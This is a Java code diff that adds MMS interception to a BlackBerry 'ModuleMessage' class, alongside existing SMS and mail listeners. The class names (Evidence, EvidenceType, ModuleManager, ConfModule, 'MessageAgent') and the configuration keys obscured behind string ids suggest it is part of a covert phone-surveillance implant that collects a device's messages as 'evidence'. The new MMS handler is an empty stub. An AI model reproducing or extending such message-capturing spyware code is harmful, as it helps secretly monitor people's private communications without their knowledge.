@@ -29,6 +29,7 @@ import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.evidence.TimestampMarkup;
 import blackberry.interfaces.MailObserver;
+import blackberry.interfaces.MmsObserver;
 import blackberry.interfaces.SmsObserver;
 import blackberry.manager.ModuleManager;
 import blackberry.module.mail.Filter;
@@ -36,6 +37,7 @@ import blackberry.module.mail.Mail;
 import blackberry.module.mail.MailListener;
 import blackberry.module.mail.MailParser;
 import blackberry.module.mail.Prefix;
+import blackberry.module.mms.MmsListener;
 import blackberry.module.sms.SmsListener;
 import blackberry.module.sms.SmsListener45;
 import blackberry.module.sms.SmsListener46;
@@ -47,7 +49,7 @@ import blackberry.utils.WChar;
  * The Class MessageAgent.
  */
 public final class ModuleMessage extends BaseModule implements SmsObserver,
-        MailObserver {
+        MmsObserver, MailObserver {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("ModMessage", DebugLevel.VERBOSE); //$NON-NLS-1$
@@ -65,6 +67,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
     MailListener mailListener;
     SmsListener smsListener;
+    MmsListener mmsListener;
 
     TimestampMarkup markupDate;
     //public Date lastcheck = new Date(0);
@@ -111,6 +114,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         smsListener = SmsListener45.getInstance();
         //#endif
         //smsListener.setMessageAgent(this);
+
+        mmsListener = MmsListener.getInstance();
     }
 
     public boolean parse(ConfModule conf) {
@@ -120,7 +125,8 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
         try {
             ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
             mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
-            ChildConf mailFilter = mailJson.getChild(Messages.getString("18.3")); //$NON-NLS-1$
+            ChildConf mailFilter = mailJson
+                    .getChild(Messages.getString("18.3")); //$NON-NLS-1$
             mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
             mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
             mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$
@@ -154,6 +160,10 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
 
         if (smsEnabled) {
             smsListener.addSmsObserver(this, null, null);
+        }
+
+        if (mmsEnabled) {
+            mmsListener.start(this);
         }
 
         if (mailEnabled) {
@@ -225,9 +235,12 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             smsListener.removeSmsObserver(this);
         }
 
+        if (mmsEnabled) {
+            mmsListener.stop();
+        }
+
         if (mailEnabled) {
             mailListener.removeSingleMailObserver(this);
-            ;
         }
     }
 
@@ -423,6 +436,11 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
             //#endif
             return false;
         }
+    }
+
+    public void onNewMms(final byte[] byteMessage, String address,
+            final boolean incomin) {
+        
     }
 
     private String getMySmsAddress() {
